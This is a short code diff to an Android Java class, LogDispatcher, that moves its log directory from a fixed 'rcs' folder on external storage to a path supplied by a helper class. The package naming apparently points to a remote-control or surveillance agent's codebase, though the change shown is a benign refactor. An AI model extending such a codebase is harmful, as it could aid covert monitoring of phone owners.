@@ -12,6 +12,7 @@ import java.util.concurrent.locks.Condition;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
 
+import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 import android.os.Environment;
@@ -126,7 +127,7 @@ public class LogDispatcher extends Thread implements Runnable {
 		Log.d("RCS", "LogDispatcher started");
 		
 		// Create log directory
-		sdDir = new File(Environment.getExternalStorageDirectory(), "rcs");
+		sdDir = new File(Path.logs());
 		sdDir.mkdirs();
 		
 		// Debug - used to remove the directory
